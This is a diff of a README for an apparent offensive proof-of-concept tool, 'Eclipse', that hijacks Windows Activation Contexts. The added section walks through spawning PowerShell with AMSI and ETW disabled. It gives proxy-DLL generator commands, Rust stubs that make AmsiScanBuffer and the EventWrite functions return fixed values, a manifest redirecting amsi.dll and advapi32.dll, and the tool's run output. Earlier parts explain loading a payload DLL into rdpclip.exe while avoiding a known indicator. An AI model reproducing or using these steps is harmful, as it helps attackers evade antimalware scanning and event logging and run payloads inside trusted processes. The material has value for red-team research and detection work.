@@ -17,7 +17,7 @@ Eclipse is a PoC that performs [Activation Context](https://learn.microsoft.com/
     -r, --resource-number
                         Resource index of the current executable where the
                         manifest is located.
-    -i, --pid           PID of the process whose Activation Context is to be
+    -p, --pid           PID of the process whose Activation Context is to be
                         hijacked.
 
 # How it works 
@@ -48,7 +48,7 @@ In case you want to embed the modified manifest file in the resulting Eclipse ex
 # Examples
 ## Hijack AC of a new process
 
-This first example is meant to give some guidelines on how to use AC hijack to load and run your DLL in a trusted process. In this case, `rdpclip.exe` will be the selected process, although this methodology can be applied to almost any other process.
+This first example is meant to give some guidelines on how to use AC hijack to load and run your DLL in a trusted process. In this case, `rdpclip.exe` (Windows 10 workstation) will be the selected process, although this methodology can be applied to almost any other process.
 First, we need to find a DLL that will be loaded by the process in a regular execution. For this, we can use [PE-bear](https://github.com/hasherezade/pe-bear) to inspect the IAT of the binary.
 
 ![rdpclip.exe IAT.](/images/pebear.PNG "rdpclip.exe IAT.")
@@ -98,7 +98,7 @@ The last and **optional** step is to embed the modified manifest file as a resou
 Finally, run the tool:
 
 	C:\Path\To\Eclipse\eclipse\target\release> eclipse.exe -m spawn -b C:\Windows\System32\rdpclip.exe -r 4
-	[+] Activation Context created locally
+	[+] Local Activation Context created.
 	[+] New process spawned in suspended mode.
 	[+] Remote process PEB base address obtained.
 	[+] Memory successfully allocated in the new process.
@@ -106,9 +106,9 @@ Finally, run the tool:
 	[+] PEB successfully patched.
 	[-] Resuming process...
 
-Inspecting the newly spawned `rdpclip.exe` process with PH will reveal that `exporttracer.dll` has been loaded. The ExportTracer acts as a proxy, meaning it loads the legitimate `crypt32.dll` to forward all the received calls, but it will also have registered in `C:\Temp\logfile.txt` all the functions from `crypt32.dll` that have been called from `rdpclip.exe`:
+Inspecting the newly spawned `rdpclip.exe` process with PH will reveal that `exporttracer.dll` has been loaded. The ExportTracer acts as a proxy, meaning it loads the legitimate `crypt32.dll` to forward all the received calls, but it will also register in `C:\Temp\logfile.txt` all the functions from `crypt32.dll` that have been called from `rdpclip.exe`:
 
-![exporttracer loaded in rdpclip.exe.](/images/exporttracer.PNG "exporttracer loaded in rdpclip.exe.")
+![exporttracer.dll loaded in rdpclip.exe.](/images/exporttracer.PNG "exporttracer.dll loaded in rdpclip.exe.")
 ![Log file.](/images/exporttracer_log.PNG "Log file.")
 
 Now, we just need to use `ADPT` once again to create a proxy dll that runs our desired payload on one of the called functions. In this case, I select the first one, `I_CryptCreateLruCache`:
@@ -122,9 +122,113 @@ Change the `loadFrom` field of the manifest file to point to the generated `prox
 
 Note how unlike when performing a regular DLL proxying, with this technique the proxy DLL does not need to have the same name as the DLL to which the calls are being forwarded, removing that specific IoC.
 
-
 ## Spawn powershell without ETW and AMSI
-## Hijack AC of an already running process
+
+Since the hijack of the main AC of a process allows us to redirect the load of any DLL, this technique can be used to modify the behaviour of a process. As a example, let's see how to use Eclipse to spawn a `powershell.exe` process with ETW (usermode) and AMSI disabled. To do so, we just need to redirect the loading of the DLLs responsible of those features: `amsi.dll` and `advapi32.dll`. First, let's create with ADPT the proxy DLL that will intercept the calls to `amsi.dll`:
+
+	C:\Path\To\ADPT\Generator\target\release> generator.exe -m proxy -p C:\Windows\System32\amsi.dll -e AmsiScanBuffer
+
+In the generated template, modify the function `AmsiScanBuffer` so it just returns 0 (classic amsi bypass):
+
+```rust
+#[no_mangle]
+fn AmsiScanBuffer(arg1:u64, arg2:u64, arg3:u64, arg4:u64, arg5:u64, arg6:u64, arg7:u64, arg8:u64, arg9:u64, arg10:u64, arg11:u64, arg12:u64, arg13:u64, arg14:u64, arg15:u64, arg16:u64, arg17:u64, arg18:u64, arg19:u64, arg20:u64) -> u64
+{
+    0
+}
+```
+
+Then compile on `release` mode the project. Then, we do the same to create the DLL that will intercept the calls to `advapi32.dll`: 
+
+	C:\Path\To\ADPT\Generator\target\release> generator.exe -m proxy -p C:\Windows\System32\advapi32.dll -e EventWrite,EventWriteEx,EventWriteString,EventWriteTransfer
+
+In the generated template, modify the code of the specified functions (`EventWrite`, `EventWriteEx`, `EventWriteString` and `EventWriteTransfer`) so they just return the value `0x6` (which is the `ERROR_INVALID_HANDLE` flag):
+
+```rust
+#[no_mangle]
+fn EventWrite(arg1:u64, arg2:u64, arg3:u64, arg4:u64, arg5:u64, arg6:u64, arg7:u64, arg8:u64, arg9:u64, arg10:u64, arg11:u64, arg12:u64, arg13:u64, arg14:u64, arg15:u64, arg16:u64, arg17:u64, arg18:u64, arg19:u64, arg20:u64) -> u64
+{
+    0x6
+}
+
+#[no_mangle]
+fn EventWriteEx(arg1:u64, arg2:u64, arg3:u64, arg4:u64, arg5:u64, arg6:u64, arg7:u64, arg8:u64, arg9:u64, arg10:u64, arg11:u64, arg12:u64, arg13:u64, arg14:u64, arg15:u64, arg16:u64, arg17:u64, arg18:u64, arg19:u64, arg20:u64) -> u64
+{
+    0x6
+}
+
+#[no_mangle]
+fn EventWriteString(arg1:u64, arg2:u64, arg3:u64, arg4:u64, arg5:u64, arg6:u64, arg7:u64, arg8:u64, arg9:u64, arg10:u64, arg11:u64, arg12:u64, arg13:u64, arg14:u64, arg15:u64, arg16:u64, arg17:u64, arg18:u64, arg19:u64, arg20:u64) -> u64
+{
+    0x6
+}
+
+#[no_mangle]
+fn EventWriteTransfer(arg1:u64, arg2:u64, arg3:u64, arg4:u64, arg5:u64, arg6:u64, arg7:u64, arg8:u64, arg9:u64, arg10:u64, arg11:u64, arg12:u64, arg13:u64, arg14:u64, arg15:u64, arg16:u64, arg17:u64, arg18:u64, arg19:u64, arg20:u64) -> u64
+{
+    0x6
+}
+```
+
+Once again, compile on `release` mode. Finally, let's craft the manifest file from which Eclipse will create the malicious AC:
+
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <description>PowerShell</description>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"></requestedExecutionLevel>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+  <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1"> 
+    <application> 
+      <!--This Id value indicates the application supports Windows Vista/Server 2008 functionality -->
+      <supportedOS Id="{e2011457-1546-43c5-a5fe-008deee3d3f0}"></supportedOS> 
+      <!--This Id value indicates the application supports Windows 7/Server 2008 R2 functionality-->
+      <supportedOS Id="{35138b9a-5d96-4fbd-8e2d-a2440225f93a}"></supportedOS>
+      <!--This Id value indicates the application supports Windows 8/Server 2012 functionality-->
+      <supportedOS Id="{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}"></supportedOS>
+      <!-- This Id value indicates the application supports Windows Blue/Server 2012 R2 functionality-->            
+      <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"></supportedOS>
+      <!-- This Id value indicates the application supports Windows Threshold functionality-->            
+      <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"></supportedOS>
+    </application> 
+  </compatibility>
+  <application xmlns="urn:schemas-microsoft-com:asm.v3">
+    <windowsSettings>
+      <longPathAware xmlns="http://schemas.microsoft.com/SMI/2016/WindowsSettings">true</longPathAware>
+    </windowsSettings>
+  </application>
+    <file name="amsi.dll" hash="optional" loadFrom="C:/Path/To/Your/proxy_amsi.dll"/>
+    <file name="advapi32.dll" hash="optional" loadFrom="C:/Path/To/Your/proxy_advapi.dll"/>
+</assembly>
+```
+
+Finally, run Eclipse (note the use of the `-n` flag  to set `CREATE_NEW_CONSOLE` at the time of spawning the new process):
+
+	C:\Path\To\Eclipse\eclipse\target\release> eclipse.exe -m spawn -b C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -f C:\Path\To\powershell.manifest -n
+	[+] Local Activation Context created.
+	[+] New process spawned in suspended mode.
+	[+] Remote process PEB base address obtained.
+	[+] Memory successfully allocated in the new process.
+	[+] Activation Context mapped in the remote process.
+	[+] PEB successfully patched.
+	[-] Resuming process...
+
+The new `powershell.exe` process will have AMSI and ETW disabled. The first one can be checked by typing the string "amsiutils", which normally would be detected as a malicious string but now it just shows a "not found" error message:
+
+![AMSI disabled.](/images/powershell1.PNG "AMSI disabled.")
+
+To check that ETW is disabled too, the tab .NET assemblies of PH can be used. This tab opens an ETW session to get this information, but the CLR is unable to write the required events due to our proxy DLL always returning `ERROR_INVALID_HANDLE`:
+
+![ETW disabled.](/images/powershell2.PNG "ETW disabled.")
+
+This is just an example to show the potential of the tecnique. The same concept could be abused to modify the behaviour of a process in many other ways.
+
+## Hijack the AC of an already running process
 
 # Conclusions
 # References
